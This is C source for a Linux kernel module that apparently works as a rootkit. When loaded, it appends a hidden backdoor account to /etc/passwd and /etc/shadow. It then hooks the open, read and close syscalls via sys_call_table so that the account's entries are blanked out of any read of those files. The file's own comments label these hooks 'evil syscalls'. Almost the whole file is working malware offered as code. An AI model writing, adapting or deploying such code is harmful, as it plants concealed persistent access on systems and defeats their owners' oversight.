#include "evil-account.h"
#include "account-details.h"
#include "hijack-syscall.h"


static int has_fug(char *, char *);
static ssize_t append_to_file(char *, char *);

int __init temp_init(void){
    // printk("enter kernel module\n");
    import_fugitive();
    hide_fugitive();
    return 0;
}

void __exit temp_exit(void){
    show_fugitive();
    // printk("exit kernel module\n");
    return;
}

/* add "fugitive" account if it is not installed already */
int import_fugitive(){
    if(has_fug(PASSWD_PATH, PASSWD_GEN()))
        append_to_file(PASSWD_PATH, PASSWD_GEN());
    if(has_fug(SHADOW_PATH, SHADOW_GEN()))
        append_to_file(SHADOW_PATH, SHADOW_GEN());
    return 0;
}

/* hijacks syscalls open and close. Details on how it works in hijack-syscall.h */
int hide_fugitive(){
    sys_call_table = (unsigned long **) kallsyms_lookup_name("sys_call_table");
    HOOK_SYSCALL(sys_call_table, good_open, king_crimson, __NR_open);
    HOOK_SYSCALL(sys_call_table, good_close, this_is_requiem, __NR_close);
    return 0;
}

/* restores syscalls */
int show_fugitive(){
    UNHOOK_SYSCALL(sys_call_table, good_open, __NR_open);
    UNHOOK_SYSCALL(sys_call_table, good_close, __NR_close);
    return 0;
}

/* helper function. return 0 if "file_path" has line "fug" */
int has_fug(char *file_path, char *fug){
    struct file *f;
    loff_t offset;
    loff_t line_start;
    char *line_str;
    char c;

    f = filp_open(file_path, O_RDONLY, ~O_CREAT);
    line_start = offset = 0;

    if(f == NULL)
        return ENOENT;

    /* read f char by char up to '\n', then
     * compare entire line to "fug"
     */
    while(kernel_read(f, &c, sizeof(char), &offset)){
        if(c == '\n'){
            line_str = kcalloc(offset-line_start+1, sizeof(char), GFP_KERNEL);
            kernel_read(f, line_str, offset-line_start, &line_start);
            if(!strcmp(line_str, fug)){
                kfree(line_str);
                return 0;
            }
            kfree(line_str);
            line_start = offset;
        }
    }
    // did not find fugitive
    return -1;
}

/* helper function. append "fug" to the end of file at "file_path" */
ssize_t append_to_file(char *file_path, char *fug){
    struct file *f;
    loff_t offset = 0;
    ssize_t ret;

    f = filp_open(file_path, O_WRONLY, ~O_CREAT);
    if(f == NULL)
        return ENOENT;

    offset = vfs_llseek(f, offset, SEEK_END);
    ret = kernel_write(f, fug, strlen(fug), &offset);
    filp_close(f,NULL);
    return ret;
}

/* evil syscall open. hijacks read if opening account related files */
asmlinkage int king_crimson(char *pathname, int flags, mode_t mode){
    if(!strcmp(PASSWD_PATH, pathname)){
        erase = PASS_E;
        goto erase_set;
    }

    if(!strcmp(SHADOW_PATH, pathname)){
        erase = SHAD_E;
        goto erase_set;
    }

    erase_set:
    if(erase && sys_call_table[__NR_read] != (void *)erase_time){
        HOOK_SYSCALL(sys_call_table, good_read, erase_time, __NR_read);
    }
    return (*good_open)(pathname, flags, mode);
}

/* evil syscall read. deletes evil account info in buffer */
asmlinkage ssize_t erase_time(int fd, void *buf, size_t count){
    ssize_t ret;
    char *hidden = NULL;
    char *ptr = NULL;

    ret = (*good_read)(fd, buf, count);

    switch(erase){
        case PASS_E:
            hidden = PASSWD_GEN();
            break;
        case SHAD_E:
            hidden = SHADOW_GEN();
            break;
        case NONE:
            //something went wrong
            break;
    }

    if(hidden != NULL){
        ptr = strnstr(buf, hidden, count);
        if(ptr != NULL)
            memset(ptr, '\0', strlen(hidden));
    }

    return ret;
}

/* evil syscall close. restores syscall read hijacked by king_crimson */
asmlinkage int this_is_requiem(int fd){
    if(erase){
        UNHOOK_SYSCALL(sys_call_table, good_read, __NR_read);
        erase = NONE;
    }
    return (*good_close)(fd);
}
